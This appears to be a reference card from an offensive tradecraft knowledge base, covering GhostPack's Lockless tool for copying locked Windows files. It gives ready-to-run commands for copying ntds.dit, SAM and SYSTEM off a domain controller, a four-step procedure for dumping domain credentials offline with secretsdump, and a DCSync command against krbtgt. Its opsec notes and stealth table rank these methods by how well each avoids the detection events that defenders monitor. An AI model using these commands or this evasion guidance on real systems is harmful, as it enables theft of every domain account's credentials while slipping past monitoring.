---
name: Lockless
category: credential-access
subcategories: [locked-file-copy, ntds-extraction, no-vss, raw-copy]
tradecraft_tags: [ntds, locked-files, raw-copy, no-vss, credential-access, ghostpack, dotnet, apollo-runnable]
mitre_attack:
  - id: T1003.003
    name: OS Credential Dumping — NTDS
source:
  url: https://github.com/GhostPack/Lockless
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: Lockless.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: false
detection_signal: |
  Lockless copies locked files (those in exclusive use by another process) via the
  NtCreateFile API with FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE flags.
  This is a lower-level approach than VSS. File access events are still generated
  (Sysmon Event 11 for ntds.dit access) — the advantage over VSS is NOT eliminating
  the file access telemetry but rather avoiding the VSS creation events (System log)
  that most detection rules target for NTDS extraction.
usage_examples:
  - description: Copy NTDS.dit while in use (no VSS creation)
    args: "Lockless.exe C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit"
  - description: Copy SYSTEM hive
    args: "Lockless.exe C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM"
  - description: Copy SAM and SYSTEM in one pass
    args: "Lockless.exe C:\\Windows\\System32\\config\\SAM C:\\Windows\\Temp\\SAM && Lockless.exe C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM"
opsec_notes: |
  Lockless's advantage over VSS-based NTDS extraction:
  - NO vssadmin.exe execution
  - NO Volume Shadow Copy creation events in System log
  - NO VSS provider registry activity
  
  What Lockless DOES generate:
  - File access event for ntds.dit (Sysmon Event 11 / Windows file auditing)
  - Process access patterns from a non-system process
  
  Lockless is stealthier than the VSS approach for NTDS extraction but NOT stealthier
  than DCSync (which generates no local file artifacts at all). Recommendation:
  1. DCSync (Apollo native) — preferred, no file artifacts
  2. Lockless — when on DC with no DCSync rights but SYSTEM access
  3. ntdsutil IFM — "legitimate" backup method, different event pattern
  4. VSS + copy — last resort, highest noise
gotchas: |
  Lockless requires local-admin access on the host where the locked file lives.
  For NTDS.dit extraction, that means SYSTEM or DA on a DC specifically. Lockless
  copies the file at a moment in time — active AD changes between the copy and
  the secretsdump parsing may cause minor inconsistencies. The SYSTEM registry hive
  is required alongside ntds.dit for offline parsing. Compared to robocopy /B (SeBackupPrivilege),
  Lockless doesn't require SeBackupPrivilege — but SeBackupPrivilege is actually LESS
  visible (backup-flagged file access is normal for backup software).
related_ttps: [shadow-copy-ntds, ntds-extract-vss, impacket-secretsdump, sebackupprivilege-abuse]
alternatives: [ntdsutil-ifm, shadow-copy-ntds, robocopy-sebackupprivilege]
common_args:
  source:
    description: Path to locked file to copy
    typical_values: ["C:\\\\Windows\\\\NTDS\\\\ntds.dit",
                     "C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM",
                     "C:\\\\Windows\\\\System32\\\\config\\\\SAM"]
    required: true
  destination:
    description: Output path for the copy
    typical_values: ["C:\\\\Windows\\\\Temp\\\\ntds.dit",
                     "C:\\\\Windows\\\\Temp\\\\SYSTEM"]
    required: true
last_updated: 2026-05-29
---

# Lockless

GhostPack's locked-file copier. Uses low-level NtCreateFile API calls to copy files
that are in exclusive use (locked) by another process — without requiring Volume Shadow
Copy Service (VSS). The primary use case is copying NTDS.dit directly from a running
domain controller without the VSS creation events that defenders hunt for.

## NTDS.dit Extraction Stealth Comparison

| Method | VSS Events | File Access Events | Process Events |
|--------|-----------|-------------------|----------------|
| DCSync (Apollo) | None | None | None (network only) |
| Lockless | **None** | YES (ntds.dit read) | Lockless.exe process |
| ntdsutil IFM | YES (VSS) | YES | ntdsutil.exe |
| vssadmin + copy | YES (VSS) | YES | vssadmin.exe |
| robocopy /B | None | YES | robocopy.exe |

Lockless sits between DCSync (cleanest) and VSS-based approaches (noisiest) by
eliminating VSS artifacts while still generating file access telemetry.

## Two-Step NTDS Extraction with Lockless

```
# On the DC (SYSTEM context required):
Step 1: Copy ntds.dit
Lockless.exe C:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

Step 2: Copy SYSTEM hive (for decryption key)
Lockless.exe C:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM

Step 3: Download both files via Apollo

Step 4: Parse offline (attacker infrastructure):
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## When to Use Lockless

Choose Lockless when:
- You have SYSTEM on a DC but DCSync fails (network restrictions block RPC replication)
- You need the full NTDS dump rather than targeted DCSync
- VSS creation is being actively monitored and Lockless's approach is quieter for the specific environment

**Always prefer DCSync first** (`Apollo: dcsync /domain:X /user:krbtgt`).
